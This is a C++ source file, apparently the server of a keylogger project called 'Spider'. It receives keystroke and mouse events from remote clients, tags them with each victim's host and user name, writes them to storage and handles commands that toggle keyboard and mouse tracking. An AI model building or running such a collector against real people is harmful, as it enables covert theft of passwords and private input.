#include "DataHandler.hpp"
#include "DataWriter.hpp"
#include "KeystrokeData.hpp"
#include "MouseData.hpp"
#include "StatusData.hpp"
#include <iostream>

void DataHandler::feedFactory(void) {
  _factory.feedCreator(static_cast<int32_t>(Spider::VALID_KEY_EVENT),
                       std::make_shared<KeystrokeData>());
  _factory.feedCreator(static_cast<int32_t>(Spider::VALID_MOUSE_EVENT),
                       std::make_shared<MouseData>());
  _factory.feedCreator(static_cast<int32_t>(Spider::VALID_GET_STATUS_RESPONSE),
                       std::make_shared<StatusData>());
}

void DataHandler::feedDataMaps(void) {
  _requestHandler = {
      {Spider::VALID_ASK_ID_RESPONSE, &DataHandler::handleIdResponse},
      {Spider::VALID_KEY_EVENT, &DataHandler::dumpData},
      {Spider::VALID_MOUSE_EVENT, &DataHandler::dumpData},
      {Spider::VALID_GET_STATUS_RESPONSE, &DataHandler::dumpData}};
  _mapRequestsMessages = {
      {Spider::VALID_PING_RESPONSE,
       std::to_string(Spider::VALID_PING_RESPONSE) + " : VALID_PING_RESPONSE"},
      {Spider::VALID_KEYBOARD_TRACK_ACTIVATE,
       std::to_string(Spider::VALID_KEYBOARD_TRACK_ACTIVATE) +
           " : VALID_KEYBOARD_TRACK_ACTIVATE"},
      {Spider::VALID_KEYBOARD_TRACK_DEACTIVATE,
       std::to_string(Spider::VALID_KEYBOARD_TRACK_DEACTIVATE) +
           " : VALID_KEYBOARD_TRACK_DEACTIVATE"},
      {Spider::VALID_MOUSE_MVMT_TRACK_ACTIVATE,
       std::to_string(Spider::VALID_MOUSE_MVMT_TRACK_ACTIVATE) +
           " : VALID_MOUSE_MVMT_TRACK_ACTIVATE"},
      {Spider::VALID_MOUSE_MVMT_TRACK_DEACTIVATE,
       std::to_string(Spider::VALID_MOUSE_MVMT_TRACK_DEACTIVATE) +
           " : VALID_MOUSE_MVMT_TRACK_DEACTIVATE"},
      {Spider::VALID_MOUSE_CLICK_TRACK_ACTIVATE,
       std::to_string(Spider::VALID_MOUSE_CLICK_TRACK_ACTIVATE) +
           " : VALID_MOUSE_CLICK_TRACK_ACTIVATE"},
      {Spider::VALID_MOUSE_CLICK_TRACK_DEACTIVATE,
       std::to_string(Spider::VALID_MOUSE_CLICK_TRACK_DEACTIVATE) +
           " : VALID_MOUSE_CLICK_TRACK_DEACTIVATE"},
      {Spider::VALID_DISCONNECT,
       std::to_string(Spider::VALID_DISCONNECT) + " : VALID_DISCONNECT"},
      {Spider::VALID_PAUSE_ACTIVATE,
       std::to_string(Spider::VALID_PAUSE_ACTIVATE) +
           " : VALID_PAUSE_ACTIVATE"},
      {Spider::VALID_PAUSE_DEACTIVATE,
       std::to_string(Spider::VALID_PAUSE_DEACTIVATE) +
           " : VALID_PAUSE_DEACTIVATE"},
      {Spider::VALID_SET_FREQUENCY,
       std::to_string(Spider::VALID_SET_FREQUENCY) + " : VALID_SET_FREQUENCY"},

      {Spider::ERROR_PING,
       std::to_string(Spider::ERROR_PING) + " : ERROR_PING"},
      {Spider::ERROR_ASK_ID,
       std::to_string(Spider::ERROR_ASK_ID) + " : ERROR_ASK_ID"},
      {Spider::ERROR_KEYBOARD_TRACK_ACTIVATE,
       std::to_string(Spider::ERROR_KEYBOARD_TRACK_ACTIVATE) +
           " : ERROR_KEYBOARD_TRACK_ACTIVATE"},
      {Spider::ERROR_KEYBOARD_TRACK_DEACTIVATE,
       std::to_string(Spider::ERROR_KEYBOARD_TRACK_DEACTIVATE) +
           " : ERROR_KEYBOARD_TRACK_DEACTIVATE"},
      {Spider::ERROR_MOUSE_MVMT_TRACK_ACTIVATE,
       std::to_string(Spider::ERROR_MOUSE_MVMT_TRACK_ACTIVATE) +
           " : ERROR_MOUSE_MVMT_TRACK_ACTIVATE"},
      {Spider::ERROR_MOUSE_MVMT_TRACK_DEACTIVATE,
       std::to_string(Spider::ERROR_MOUSE_MVMT_TRACK_DEACTIVATE) +
           " : ERROR_MOUSE_MVMT_TRACK_DEACTIVATE"},
      {Spider::ERROR_MOUSE_CLICK_TRACK_ACTIVATE,
       std::to_string(Spider::ERROR_MOUSE_CLICK_TRACK_ACTIVATE) +
           " : ERROR_MOUSE_CLICK_TRACK_ACTIVATE"},
      {Spider::ERROR_MOUSE_CLICK_TRACK_DEACTIVATE,
       std::to_string(Spider::ERROR_MOUSE_CLICK_TRACK_DEACTIVATE) +
           " : ERROR_MOUSE_CLICK_TRACK_DEACTIVATE"},
      {Spider::ERROR_DISCONNECT,
       std::to_string(Spider::ERROR_DISCONNECT) + " : ERROR_DISCONNECT"},
      {Spider::ERROR_PAUSE_ACTIVATE,
       std::to_string(Spider::ERROR_PAUSE_ACTIVATE) +
           " : ERROR_PAUSE_ACTIVATE"},
      {Spider::ERROR_PAUSE_DEACTIVATE,
       std::to_string(Spider::ERROR_PAUSE_DEACTIVATE) +
           " : ERROR_PAUSE_DEACTIVATE"},
      {Spider::ERROR_SET_FREQUENCY,
       std::to_string(Spider::ERROR_SET_FREQUENCY) + " : ERROR_SET_FREQUENCY"},
      {Spider::ERROR_GET_STATUS,
       std::to_string(Spider::ERROR_GET_STATUS) + " : ERROR_GET_STATUS"}};
}

DataHandler::DataHandler(void) {
  feedDataMaps();
  feedFactory();
}

void DataHandler::handleData(const int &id, const std::vector<char> &data) {
  Spider::RequestCode requestNumber =
      *(reinterpret_cast<const Spider::RequestCode *>(&data[0]));
  treatId(id);

  if (_requestHandler.find(requestNumber) == _requestHandler.end())
    PrintCodeResponse(id, {_mapClients[id].first, _mapClients[id].second},
                      data);
  else
    _requestHandler[requestNumber](
        *this, id, {_mapClients[id].first, _mapClients[id].second}, data);
}

void DataHandler::treatId(const int &id) {
  auto it = _mapClients.find(id);
  if (it == _mapClients.end())
    _mapClients[id] = {"", ""};
}

bool DataHandler::isIdSet(const int &id) {
  return (_mapClients[id].first.size() + _mapClients[id].second.size() == 0
              ? false
              : true);
}

void DataHandler::handleIdResponse(
    const int &id, const std::pair<std::string, std::string> & /*hostUser*/,
    const std::vector<char> &data) {

  if (data.size() < sizeof(int32_t) + sizeof(char[256]) + sizeof(char[256])) {
    std::cerr << "Invalid Packet size for VALID_ASK_ID_RESPONSE." << std::endl;
    return;
  }
  _mapClients[id].first =
      std::string(reinterpret_cast<const char *>(&data[sizeof(int32_t)]));
  _mapClients[id].second = std::string(reinterpret_cast<const char *>(
      &data[sizeof(int32_t) + sizeof(char[256])]));
  std::cout << static_cast<int32_t>(Spider::VALID_ASK_ID_RESPONSE)
            << " : VALID_ASK_ID_RESPONSE -- host=" << _mapClients[id].first
            << "user=" << _mapClients[id].second << std::endl;
  std::cout << "server >> " << std::flush;
}

void DataHandler::dumpData(const int & /* id */,
                           const std::pair<std::string, std::string> &hostUser,
                           const std::vector<char> &data) {
  Spider::RequestCode requestNumber =
      *(reinterpret_cast<const Spider::RequestCode *>(&data[0]));

  static DataWriter writer;

  if (requestNumber == Spider::VALID_GET_STATUS_RESPONSE) {
    std::cout << hostUser.first << "@" << hostUser.second << " -- "
              << static_cast<int32_t>(Spider::VALID_GET_STATUS_RESPONSE)
              << " : VALID_GET_STATUS_RESPONSE" << std::endl;
    std::cout << "server >> " << std::flush;
  }

  std::shared_ptr<IData> dataObj =
      _factory.createInstance(static_cast<int32_t>(requestNumber), data);

  writer.writeData(hostUser.first, hostUser.second, dataObj->getData());
  dataObj->dump();
}

void DataHandler::PrintCodeResponse(
    const int & /* id */, const std::pair<std::string, std::string> &hostUser,
    const std::vector<char> &data) {
  Spider::RequestCode requestNumber =
      *(reinterpret_cast<const Spider::RequestCode *>(&data[0]));

  if (_mapRequestsMessages.find(requestNumber) == _mapRequestsMessages.end())
    std::cout << hostUser.first << "@" << hostUser.second << " -- "
              << static_cast<int32_t>(requestNumber)
              << ": Request code not handled by this server." << std::endl;
  else {
    std::cout << hostUser.first << "@" << hostUser.second << " -- "
              << static_cast<int32_t>(requestNumber) << ": "
              << _mapRequestsMessages[requestNumber] << "received."
              << std::endl;
    std::cout << "server >> " << std::flush;
  }
}
